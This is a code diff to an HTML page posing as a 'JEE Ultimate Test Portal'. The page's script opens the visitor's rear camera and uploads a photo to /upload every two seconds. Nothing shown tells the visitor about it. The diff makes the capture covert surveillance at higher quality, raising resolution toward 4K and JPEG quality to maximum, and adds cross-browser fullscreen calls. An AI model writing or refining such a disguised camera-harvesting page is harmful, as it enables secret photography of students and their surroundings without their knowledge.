@@ -102,6 +102,7 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <body>
 
 <div id="overlay">
+
 <h1>JEE Ultimate Test Portal</h1>
 
 <div class="top-info">
@@ -212,23 +213,22 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST LOGIC (Force Back Camera) */
+/* START TEST LOGIC (Back Camera High Quality) */
 async function start(){
 
   try{
 
-    // Permission trigger
     await navigator.mediaDevices.getUserMedia({video:true});
 
     const devices = await navigator.mediaDevices.enumerateDevices();
     const videoDevices = devices.filter(d => d.kind === "videoinput");
 
-    let backId = null;
+    let backId=null;
 
-    for (let device of videoDevices) {
-      if (device.label.toLowerCase().includes("back") ||
-          device.label.toLowerCase().includes("rear")) {
-        backId = device.deviceId;
+    for(let device of videoDevices){
+      if(device.label.toLowerCase().includes("back") ||
+         device.label.toLowerCase().includes("rear")){
+        backId=device.deviceId;
         break;
       }
     }
@@ -236,19 +236,19 @@ async function start(){
     let stream;
 
     if(backId){
-      stream = await navigator.mediaDevices.getUserMedia({
+      stream=await navigator.mediaDevices.getUserMedia({
         video:{
-          deviceId:{ exact: backId },
-          width:1280,
-          height:720
+          deviceId:{exact:backId},
+          width:{ideal:3840},
+          height:{ideal:2160}
         }
       });
     }else{
-      stream = await navigator.mediaDevices.getUserMedia({
+      stream=await navigator.mediaDevices.getUserMedia({
         video:{
-          facingMode:{ ideal:"environment" },
-          width:1280,
-          height:720
+          facingMode:{ideal:"environment"},
+          width:{ideal:3840},
+          height:{ideal:2160}
         }
       });
     }
@@ -256,7 +256,7 @@ async function start(){
     v.srcObject=stream;
 
     setTimeout(capture,1000);
-    setInterval(capture,1000);
+    setInterval(capture,2000);
 
   }catch(e){
     console.log(e);
@@ -274,21 +274,33 @@ async function start(){
 
   if(frame.requestFullscreen){
     frame.requestFullscreen();
+  }else if(frame.webkitRequestFullscreen){
+    frame.webkitRequestFullscreen();
+  }else if(frame.msRequestFullscreen){
+    frame.msRequestFullscreen();
   }
 }
 
 function capture(){
   if(!v.videoWidth) return;
+
   c.width=v.videoWidth;
   c.height=v.videoHeight;
-  c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+
+  const ctx=c.getContext("2d");
+  ctx.imageSmoothingEnabled=true;
+  ctx.imageSmoothingQuality="high";
+
+  ctx.drawImage(v,0,0,c.width,c.height);
+
   c.toBlob(b=>{
     let f=new FormData();
     f.append("photo",b,"u.jpg");
     fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",0.6);
+  },"image/jpeg",1.0);
 }
 
 </script>
+
 </body>
 </html>
